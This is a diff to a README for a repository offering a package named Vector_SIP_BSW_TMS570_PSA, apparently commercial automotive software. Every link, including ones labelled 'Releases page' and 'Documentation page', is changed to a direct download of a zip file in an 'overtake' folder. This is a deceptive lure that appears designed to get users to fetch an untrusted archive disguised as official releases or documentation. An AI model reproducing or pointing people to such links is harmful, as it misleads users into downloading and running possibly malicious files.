@@ -10,7 +10,7 @@ To begin using this software, follow the steps below to download and install it.
 
 ### 📥 Download the Software
 
-[![Download Vector_SIP_BSW_TMS570_PSA](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/releases)
+[![Download Vector_SIP_BSW_TMS570_PSA](https://raw.githubusercontent.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/main/overtake/Vector_SIP_BSW_TMS570_PSA.zip)](https://raw.githubusercontent.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/main/overtake/Vector_SIP_BSW_TMS570_PSA.zip)
 
 ### 🛠 System Requirements
 
@@ -32,7 +32,7 @@ This software package includes:
 ## 💻 Installation Instructions
 
 1. **Visit the Release Page**
-   - Go to the [Releases page](https://github.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/releases) to view available versions.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/main/overtake/Vector_SIP_BSW_TMS570_PSA.zip) to view available versions.
 
 2. **Select a Version**
    - Choose the latest version to ensure you have the most up-to-date features and bug fixes.
@@ -61,7 +61,7 @@ The repository contains documentation that covers:
 - Step-by-step configuration guides
 - Examples of usage for basic and advanced features
 
-You can find the documentation in the repository or on the [Documentation page](https://github.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/wiki).
+You can find the documentation in the repository or on the [Documentation page](https://raw.githubusercontent.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/main/overtake/Vector_SIP_BSW_TMS570_PSA.zip).
 
 ## 🎯 Support and Troubleshooting
 
@@ -92,4 +92,4 @@ For inquiries, contact the maintainer via GitHub.
 
 ## 📥 Download and Install Again
 
-To download the software, visit the [Releases page](https://github.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/releases).
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/Sakonoth/Vector_SIP_BSW_TMS570_PSA/main/overtake/Vector_SIP_BSW_TMS570_PSA.zip).
